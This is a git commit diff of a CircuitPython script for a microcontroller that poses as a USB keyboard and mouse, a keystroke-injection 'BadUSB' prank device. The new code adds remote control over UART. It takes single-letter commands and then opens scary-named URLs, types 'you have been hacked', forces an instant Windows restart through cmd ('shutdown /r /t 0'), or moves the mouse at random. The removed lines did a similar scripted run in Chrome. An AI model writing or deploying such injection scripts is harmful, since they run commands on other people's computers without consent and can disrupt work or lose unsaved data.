244918024481056f9cccde833eb1f742095a948f
mushahidq <mushahidq@gmail.com>
2021-04-03 17:16:35 +0530

    added bluetooth connectivity for more fun

--- code.py
+++ code.py
@@ -2,51 +2,55 @@ import usb_hid
 from adafruit_hid.keyboard import Keyboard
 from adafruit_hid.keycode import Keycode
 from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
+from adafruit_hid.mouse import Mouse
 import time
 import board
 import digitalio
+import busio
+from random import randint
 
+mouse = Mouse(usb_hid.devices)
 keyboard = Keyboard(usb_hid.devices)
 layout = KeyboardLayoutUS(keyboard)
 
 led = digitalio.DigitalInOut(board.GP25)
 led.direction = digitalio.Direction.OUTPUT
-time.sleep(5)
 
+uart = busio.UART(tx=board.GP0, rx=board.GP1)
 
 while True:
-    led.value = True
-    keyboard.send(Keycode.GUI, Keycode.R)
-    time.sleep(0.1)
-    layout.write("chrome\n")
-    time.sleep(0.5)
-    layout.write("http://www.5z8.info/worm_dvim \n")
-    time.sleep(1)
-    keyboard.send(Keycode.CONTROL, Keycode.T)
-    time.sleep(0.5)
-    layout.write("http://www.5z8.info/ip-stealer_fhli \n")
-    keyboard.send(Keycode.F11)
-    keyboard.send(Keycode.F6)
-    time.sleep(1)
-    keyboard.send(Keycode.CONTROL, Keycode.T)
-    keyboard.send(Keycode.F11)
-    keyboard.send(Keycode.F6)
-    time.sleep(0.5)
-    layout.write("http://www.5z8.info/trojan_zhgr \n")
-    keyboard.send(Keycode.ENTER)
-    keyboard.send(Keycode.F11)
-    keyboard.send(Keycode.THREE)
-    time.sleep(0.5)
-    keyboard.send(Keycode.THREE)
-    time.sleep(0.5)
-    keyboard.send(Keycode.THREE)
-    time.sleep(0.5)
-    count = 100
-    while count > 0:
-        layout.write("you have been hacked")
-        time.sleep(0.5)
-        break
-        count -= 1
-    led.value = False
-    break
-    time.sleep(100)
+    data = uart.read(1)
+    print(data)
+
+    if data is not None:
+        led.value = True
+
+        data_string = " ".join([chr(b) for b in data])
+        print(data_string, end="")
+
+        led.value = False
+
+        if data_string == "A":
+            keyboard.send(Keycode.GUI, Keycode.R)
+            time.sleep(0.1)
+            layout.write("chrome\n")
+            time.sleep(0.5)
+            layout.write("http://www.5z8.info/worm_dvim \n")
+        elif data_string == "B":
+            count = 100
+            while count > 0:
+                layout.write("you have been hacked")
+                time.sleep(0.02)
+                break
+                count -= 1
+        elif data_string == "C":
+            keyboard.send(Keycode.GUI, Keycode.R)
+            time.sleep(0.1)
+            layout.write("cmd\n")
+            time.sleep(0.5)
+            layout.write("shutdown /r /t 0 /c \"Sorry, not sorry xD\" \n")
+        elif data_string == "D":
+            start = time.monotonic()
+            while time.monotonic() - start < 20:
+                mouse.move(x=randint(-20, 20), y=randint(-20, 20))
+                mouse.move(x=randint(-20, 20), y=randint(-20, 20))
